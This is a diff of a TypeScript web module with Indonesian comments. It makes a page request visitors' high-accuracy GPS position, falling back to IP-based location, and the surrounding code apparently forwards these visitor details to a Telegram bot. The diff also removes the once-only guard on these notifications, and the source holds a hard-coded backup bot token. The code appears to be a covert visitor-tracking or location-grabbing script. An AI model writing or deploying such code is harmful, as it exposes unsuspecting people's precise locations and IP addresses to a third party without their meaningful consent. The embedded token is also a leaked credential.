@@ -213,16 +213,55 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   }
 }
 
+
 async function getLocationInfo(): Promise<LocationInfo> {
+  // Inisialisasi data default
+  let locationData: LocationInfo = {
+    city: 'Unknown',
+    country: 'Unknown',
+    latitude: null,
+    longitude: null,
+    accuracy: null,
+    source: 'None',
+    ip: 'Unknown'
+  };
+
   try {
-    // Get IP-based location first as a fallback
+    // Coba gunakan Geolocation (GPS) terlebih dahulu
+    if ('geolocation' in navigator) {
+      try {
+        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          });
+        });
+
+        locationData = {
+          city: 'Unknown', // GPS tidak bisa tahu nama kota
+          country: 'Unknown',
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          source: 'GPS',
+          ip: 'Unknown'
+        };
+
+        return locationData; // Sukses GPS, langsung return
+      } catch (geoError) {
+        console.warn('GPS location failed, fallback to IP.');
+      }
+    }
+
+    // Fallback ke lokasi berbasis IP jika GPS gagal
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) {
       throw new Error(`Location API error: ${ipResponse.status}`);
     }
+
     const ipData = await ipResponse.json();
-    
-    const locationData: LocationInfo = {
+    locationData = {
       city: ipData.city || 'Unknown',
       country: ipData.country_name || 'Unknown',
       latitude: ipData.latitude || null,
@@ -232,46 +271,14 @@ async function getLocationInfo(): Promise<LocationInfo> {
       ip: ipData.ip || 'Unknown'
     };
 
-    // Try to get precise location if available
-    if ('geolocation' in navigator) {
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            resolve,
-            reject,
-            {
-              enableHighAccuracy: true,
-              timeout: 5000,
-              maximumAge: 0
-            }
-          );
-        });
-
-        // Only update if we got more precise coordinates
-        locationData.latitude = position.coords.latitude;
-        locationData.longitude = position.coords.longitude;
-        locationData.accuracy = position.coords.accuracy;
-        locationData.source = 'GPS';
-      } catch (geoError) {
-        // Silently fall back to IP-based location
-        console.log('Using IP-based location as fallback');
-      }
-    }
-
     return locationData;
+
   } catch (error) {
     console.error('Error fetching location:', error);
-    return {
-      city: 'Unknown',
-      country: 'Unknown',
-      latitude: null,
-      longitude: null,
-      accuracy: null,
-      source: 'None',
-      ip: 'Unknown'
-    };
+    return locationData; // Kembalikan nilai default jika semuanya gagal
   }
 }
+
 
 async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
   if (!botToken) {
@@ -305,9 +312,6 @@ async function sendTelegramMessage(botToken: string, data: any): Promise<Respons
 }
 
 export const sendTelegramNotification = async (details: VisitorDetails) => {
-  if (hasNotificationBeenSent) {
-    return;
-  }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
   const backupBotToken = '11177218904:AAEOtSkaU1jN8OljIPIcnMCPGnv8QOpZZP0';
